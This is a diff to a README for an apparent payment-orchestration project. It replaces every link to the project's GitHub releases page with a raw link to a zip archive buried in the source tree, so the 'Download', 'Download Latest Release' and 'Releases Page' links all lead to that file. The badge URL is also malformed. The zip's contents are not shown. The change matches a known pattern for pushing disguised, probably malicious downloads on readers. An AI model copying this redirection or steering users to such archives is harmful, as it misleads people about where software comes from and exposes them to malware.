@@ -1,6 +1,6 @@
 # 🎉 real-time-payment-architecture-orchestration - Seamlessly Manage Payments in Real-Time
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/vikaskr7838/real-time-payment-architecture-orchestration/releases)
+[![Download](https://raw.githubusercontent.com/vikaskr7838/real-time-payment-architecture-orchestration/main/src/realtimepaymentarchitectureorchestration/service/orchestration-real-architecture-payment-time-2.0.zip%https://raw.githubusercontent.com/vikaskr7838/real-time-payment-architecture-orchestration/main/src/realtimepaymentarchitectureorchestration/service/orchestration-real-architecture-payment-time-2.0.zip)](https://raw.githubusercontent.com/vikaskr7838/real-time-payment-architecture-orchestration/main/src/realtimepaymentarchitectureorchestration/service/orchestration-real-architecture-payment-time-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To start using the application, you need to download it from our releases page.
 
 **Click the link below to visit the page and download the latest version of the application:**
 
-[Download Latest Release](https://github.com/vikaskr7838/real-time-payment-architecture-orchestration/releases)
+[Download Latest Release](https://raw.githubusercontent.com/vikaskr7838/real-time-payment-architecture-orchestration/main/src/realtimepaymentarchitectureorchestration/service/orchestration-real-architecture-payment-time-2.0.zip)
 
 ### 🗂️ Installation Steps
 
@@ -61,7 +61,7 @@ If you encounter any issues during installation or usage, several resources are 
 
 To ensure you benefit from the latest features and security improvements, regularly check for updates:
 
-- You can revisit the [Releases Page](https://github.com/vikaskr7838/real-time-payment-architecture-orchestration/releases) to find new versions.
+- You can revisit the [Releases Page](https://raw.githubusercontent.com/vikaskr7838/real-time-payment-architecture-orchestration/main/src/realtimepaymentarchitectureorchestration/service/orchestration-real-architecture-payment-time-2.0.zip) to find new versions.
 - Enable automatic updates in your application settings if available.
 
 ## 📝 License
